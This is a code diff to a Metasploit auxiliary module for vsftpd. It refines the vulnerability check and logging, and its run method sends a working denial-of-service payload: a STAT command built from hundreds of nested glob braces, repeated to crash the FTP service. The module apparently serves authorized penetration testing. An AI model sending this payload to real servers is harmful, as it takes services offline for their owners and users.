@@ -60,14 +60,21 @@ class MetasploitModule < Msf::Auxiliary
   def check
     # attempt to connect
     begin
-      return Exploit::CheckCode::Unknown('Failed to connect or authenticate via FTP') unless connect_login
+      connect
     rescue Rex::ConnectionRefused
       return Exploit::CheckCode::Unknown('Connection refused by the target')
     rescue Rex::ConnectionTimeout
       return Exploit::CheckCode::Unknown('Connection timed out')
     end
 
-    vprint_status("FTP banner: #{sanitize_ftp_response(banner)}") if banner
+    return Exploit::CheckCode::Safe("Does not appear to be VSFTPD (banner: #{sanitize_ftp_response})") unless banner&.downcase&.include?('vsftpd')
+    vprint_status("FTP banner: #{sanitize_ftp_response}") if banner
+
+    res = send_user(user)
+    return Exploit::CheckCode::Unknown("Failed to connect or authenticate via FTP: #{res}") unless res =~ /^(331|2)/
+
+    res = send_pass(pass)
+    return Exploit::CheckCode::Unknown("Failed to connect or authenticate via FTP: #{res}") unless res =~ /^2/
 
     s = ''
     stat_output = ''
@@ -120,9 +127,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     payload = 'STAT ' + '{{*},' * 487 + '{.}' + '}' * 487
-    vprint_status("FTP command being sent: #{payload}")
-
-    print_status('Sending DoS command')
+    vprint_status("FTP DoS command: #{payload}")
 
     attempts = 0
     max = datastore['MAX_ATTEMPTS'].to_i
@@ -136,6 +141,7 @@ class MetasploitModule < Msf::Auxiliary
 
       connect_login
       10.times do
+        print_status('Sending DoS command')
         send_cmd([payload.to_s], false)
       end
       send_cmd([payload.to_s], true)
